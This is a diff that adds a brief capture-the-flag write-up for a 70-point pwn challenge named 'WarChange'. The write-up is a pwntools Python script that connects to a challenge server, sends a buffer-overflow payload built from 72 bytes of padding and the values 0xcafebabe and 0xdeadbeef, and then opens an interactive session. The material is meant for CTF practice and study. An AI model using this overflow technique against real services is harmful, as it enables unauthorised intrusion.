@@ -1,0 +1,17 @@
+# WarChange
+**Category**: pwn
+**Points**: 70
+
+
+# Write-Up
+```python
+from pwn import *
+
+p = remote('139.59.30.165',8800)
+payload = "A"*72
+payload += p32(0xcafebabe)
+payload += p32(0xdeadbeef)
+payload += "A"*50	
+p.sendline(payload)
+p.interactive()
+```
